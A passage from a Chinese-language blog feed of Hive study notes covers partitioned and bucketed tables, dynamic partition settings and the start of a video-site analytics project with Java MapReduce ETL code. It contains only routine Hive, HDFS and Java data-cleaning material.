punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/hive/datas/dept_20200401.log /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>14<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行添加分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition2 add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>,hour<span class="token operator">=</span><span class="token string">'14'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'14'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）方式三：创建文件夹后，load数据到分区</p><p>创建目录</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>15<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200401.log'</span> into table dept_partition2 partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>,hour<span class="token operator">=</span><span class="token string">'15'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'15'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-动态分区"><a href="#1-3-动态分区" class="headerlink" title="1.3 动态分区"></a>1.3 动态分区</h3><p><strong>上面的分区都是我们手动去指定的，但是在实际应用中，对于大数据不可能每条都手动去分区，因此，Hive有个功能叫做动态分区</strong>。对比关系型数据库中，对分区表Insert数据时候，数据库自动会根据分区字段的值，将数据插入到相应的分区中，Hive中也提供了类似的机制，即动态分区(Dynamic Partition)，只不过，使用Hive的动态分区，需要进行相应的配置。</p><p>1） 开启动态分区参数设置**(3-6可以不改，使用默认值)**</p><p>（0）查看动态分区功能（默认true，开启）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.dynamic.partition<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）开启动态分区功能（默认true，开启）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.dynamic.partition<span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）设置为非严格模式（动态分区的模式，默认strict，表示必须指定至少一个分区为静态分区，nonstrict模式表示允许所有的分区字段都可以使用动态分区。）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.dynamic.partition.mode<span class="token operator">=</span>nonstrict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）在所有执行MR的节点上，最大一共可以创建多少个动态分区。默认1000</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.dynamic.partitions<span class="token operator">=</span>1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）在每个执行MR的节点上，最大可以创建多少个动态分区。该参数需要根据实际的数据来设定。比如：源数据中包含了一年的数据，即day字段有365个值，那么该参数就需要设置成大于365，如果使用默认值100，则会报错。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.dynamic.partitions.pernode<span class="token operator">=</span>100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）整个MR Job中，最大可以创建多少个HDFS文件。默认100000</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.exec.max.created.files<span class="token operator">=</span>100000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）当有空分区生成时，是否抛出异常。一般不需要设置。默认false</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> hive.error.on.empty.partition<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）案例实操</p><p><strong>需求：将dept表中的数据按照时间（day字段），插入到目标表dept_partition的相应分区中。</strong></p><p>（1）创建目标分区表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition_dy<span class="token punctuation">(</span>id int, name string,loc string<span class="token punctuation">)</span> partitioned by <span class="token punctuation">(</span>day string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）设置动态分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.exec.dynamic.partition.mode <span class="token operator">=</span> nonstrict<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）      插入表数据</p><p><strong>方法1：导入本地数据到hive中</strong></p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive-3.4.2/datas/dept_partition_dy.txt'</span> into table dept_partition_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候可以发现 启动了mapreduce,因为用到了计算，这里需要注意的是，有可能会报错：找不到dept_partition_dy.txt文件，因为用到了计算，会启用yarn进行分配job，运行该job的不一定在当前机器hadoop102,也有可能在hadoop103。所以为了不出错，我们最好将数据先传到hdfs上，然后去load。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/dept_partition_dy.txt'</span> into table dept_partition_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法2：通过insert插入</p><p>因为低版本的load是不会启用mapreduce计算的，因此我们可以先将数据导入一个普通表，然后通过insert select查询操作将数据导入分区表中。</p><p>（a）先将数据导入普通表dept_dy</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive-3.4.2/datas/dept_partition_dy.txt'</span> into table dept_dy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（b）通过insert select查询操作将数据导入分区表dept_partition_dy中，因为insert操作会启用计算mapreduce</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert into dept_partition_dy <span class="token keyword">select</span> * from dept_by<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看目标分区表的分区情况和表数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition_dy<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> show partitions dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>思考：目标分区表是如何匹配到分区字段的？</p><p>要求插入的数据必须要有分区字段，即上面提到的day，这样才能根据数据文件中的day去匹配加入对应的分区。例如导入的文件为：</p><p>  <img src="/2020/11/15/bigdata-hive3/1636983103553.png" alt="1636983103553"></p><h1 id="2-分桶表"><a href="#2-分桶表" class="headerlink" title="2 分桶表"></a>2 分桶表</h1><p>分区提供一个隔离数据和优化查询的便利方式。不过，并非所有的数据集都可形成合理的分区。对于一张表或者分区，Hive 可以进一步组织成桶，也就是更为细粒度的数据范围划分。</p><p>分桶是将数据集分解成更容易管理的若干部分的另一个技术。</p><p><strong>分区针对的是数据的存储路径；分桶针对的是数据文件。</strong></p><h2 id="2-1-先创建分桶表"><a href="#2-1-先创建分桶表" class="headerlink" title="2.1 先创建分桶表"></a>2.1 先创建分桶表</h2><p>（1）数据准备</p><pre><code>1001  ss11002  ss21003  ss31004  ss41005  ss51006  ss61007  ss71008  ss81009  ss91010  ss101011  ss111012  ss121013  ss131014  ss141015  ss151016  ss16</code></pre><p>（2）创建分桶表—根据字段id去进行分桶，并且分4个桶</p><pre class="line-numbers language-bash"><code class="language-bash">create table stu_bucket<span class="token punctuation">(</span>id int, name string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> into 4 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（3）查看表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted stu_bucket<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）导入数据到分桶表中，load的方式</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath  <span class="token string">'/student.txt'</span> into table stu_bucket<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）查看创建的分桶表中是否分成4个桶</p><p>  <img src="/2020/11/15/bigdata-hive3/1636983158547.png" alt="1636983158547"></p><p>（6）查询分桶的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from stu_buck<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（7）分桶规则：</p><p>根据结果可知：Hive的分桶采用对分桶字段的值进行哈希，然后除以桶的个数求余的方 式决定该条记录存放在哪个桶当中</p><h2 id="2-2-分桶表操作需要注意的事项"><a href="#2-2-分桶表操作需要注意的事项" class="headerlink" title="2.2 分桶表操作需要注意的事项"></a>2.2 分桶表操作需要注意的事项</h2><p>（1）reduce的个数设置为-1,让Job自行决定需要用多少个reduce或者将reduce的个数设置为大于等于分桶表的桶数</p><p>（2）从hdfs中load数据到分桶表中，避免本地文件找不到问题</p><p>（3）不要使用本地模式</p><h2 id="2-3-insert方式将数据导入分桶表"><a href="#2-3-insert方式将数据导入分桶表" class="headerlink" title="2.3 insert方式将数据导入分桶表"></a>2.3 insert方式将数据导入分桶表</h2><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>insert into table stu_buck <span class="token keyword">select</span> * from student_insert <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（五） Hive实战</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive5-example/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-需求描述"><a href="#1-需求描述" class="headerlink" title="1 需求描述"></a>1 需求描述</h2><p>统计硅谷影音视频网站的常规指标，各种TopN指标：</p><p>– 统计视频观看数Top10</p><p>– 统计视频类别热度Top10</p><p>– 统计出视频观看数最高的20个视频的所属类别以及类别包含Top20视频的个数</p><p>– 统计视频观看数Top50所关联视频的所属类别Rank</p><p>– 统计每个类别中的视频热度Top10,以Music为例</p><p>– 统计每个类别视频观看数Top10</p><p>– 统计上传视频最多的用户Top10以及他们上传的视频观看次数在前20的视频 </p><h2 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2 数据结构"></a>2 数据结构</h2><p>1）视频表</p><p>视频表</p><table><thead><tr><th>字段</th><th>备注</th><th>详细描述</th></tr></thead><tbody><tr><td>videoId</td><td>视频唯一id（String）</td><td>11位字符串</td></tr><tr><td>uploader</td><td>视频上传者（String）</td><td>上传视频的用户名String</td></tr><tr><td>age</td><td>视频年龄（int）</td><td>视频在平台上的整数天</td></tr><tr><td>category</td><td>视频类别（Array<String>）</String></td><td>上传视频指定的视频分类</td></tr><tr><td>length</td><td>视频长度（Int）</td><td>整形数字标识的视频长度</td></tr><tr><td>views</td><td>观看次数（Int）</td><td>视频被浏览的次数</td></tr><tr><td>rate</td><td>视频评分（Double）</td><td>满分5分</td></tr><tr><td>Ratings</td><td>流量（Int）</td><td>视频的流量，整型数字</td></tr><tr><td>conments</td><td>评论数（Int）</td><td>一个视频的整数评论数</td></tr><tr><td>relatedId</td><td>相关视频id（Array<String>）</String></td><td>相关视频的id，最多20个</td></tr></tbody></table><p>2）用户表</p><p>用户表</p><table><thead><tr><th>字段</th><th>备注</th><th>字段类型</th></tr></thead><tbody><tr><td>uploader</td><td>上传者用户名</td><td>string</td></tr><tr><td>videos</td><td>上传视频数</td><td>int</td></tr><tr><td>friends</td><td>朋友数量</td><td>int</td></tr></tbody></table><h2 id="3-准备工作"><a href="#3-准备工作" class="headerlink" title="3 准备工作"></a>3 准备工作</h2><h3 id="3-1-ETL"><a href="#3-1-ETL" class="headerlink" title="3.1 ETL"></a>3.1 ETL</h3><p><strong>ETL即数据预处理。</strong></p><p>原始数据一行展示：</p><pre class="line-numbers language-bash"><code class="language-bash">LKh7zAJ4nwo    TheReceptionist    653    People <span class="token operator">&amp;</span> Blogs    424    13021    4.34    1305    744    DjdA-5oKYFQ    NxTDlnOuybo    c-8VuICzXtU    DH56yrIO5nI    W1Uo5DQTtzc    E-3zXq_r4w0    1TCeoRPg5dE    yAr26YhuYNY    2ZgXx72XmoE    -7ClGo-YgZ0    vmdPOOd6cxI    KRHfMQqSHpk    pIMpORZthYw    1tUDzOp10pk    heqocRij5P0    _XIuvoH6rUg    LGVU5DsezE0    uO2kj6_D8B4    xiDqywcDQRM    uX81lMev6_o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过观察原始数据形式，可以发现，视频可以有多个所属分类，每个所属分类用&amp;符号分割，且分割的两边有空格字符，同时相关视频也是可以有多个元素，多个相关视频又用“\t”进行分割。为了分析数据时方便对存在多个子元素的数据进行操作，我们首先进行数据重组清洗操作。即：将所有的类别用“&amp;”分割，同时去掉两边空格，多个相关视频id也使用“&amp;”进行分割。</p><p>1）ETL之封装工具类:用于具体处理数据的工具</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ETLUtil</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**   \* 数据清洗方法   */</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">etlData</span><span class="token punctuation">(</span>String srcData<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    StringBuffer resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//1. 先将数据通过\t 切割</span>​    String<span class="token punctuation">[</span><span class="token punctuation">]</span> datas <span class="token operator">=</span> srcData<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//2. 判断长度是否小于9</span>​    <span class="token keyword">if</span><span class="token punctuation">(</span>datas<span class="token punctuation">.</span>length <span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​      <span class="token keyword">return</span> null <span class="token punctuation">;</span>​    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//3. 将数据中的视频类别的空格去掉</span>​    datas<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>datas<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token comment" spellcheck="true">//4. 将数据中的关联视频id通过&amp;拼接</span>​    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> datas<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​      <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token comment" spellcheck="true">//4.1 没有关联视频的情况</span>​        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> datas<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token comment" spellcheck="true">//4.2 有关联视频的情况</span>​        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> datas<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​          resultData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>datas<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token keyword">return</span> resultData<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）ETL之Mapper</p><pre class="line-numbers language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/** \* 清洗谷粒影音的原始数据 \* 清洗规则 \* 1. 将数据长度小于9的清洗掉 \*  2. 将数据中的视频类别中间的空格去掉  People &amp; Blogs \* 3. 将数据中的关联视频id通过&amp;符号拼接 */</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EtlMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>LongWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span>Text<span class="token punctuation">,</span> NullWritable<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> Text k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">map</span><span class="token punctuation">(</span>LongWritable key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取一行</span>     String line <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//清洗</span>     String resultData <span class="token operator">=</span> ETLUtil<span class="token punctuation">.</span><span class="token function">etlData</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token keyword">if</span><span class="token punctuation">(</span>resultData <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​       <span class="token comment" spellcheck="true">//写出</span>​       k<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>resultData<span class="token punctuation">)</span><span class="token punctuation">;</span>​       context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>NullWritable<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）ETL之Driver</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>gulivideo<span class="token punctuation">.</span>etl<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>NullWritable<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span> <span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EtlDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     Configuration conf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>EtlDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>EtlMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>NullWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     job<span class="token punctuation">.</span><span class="token function">setNumReduceTasks</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 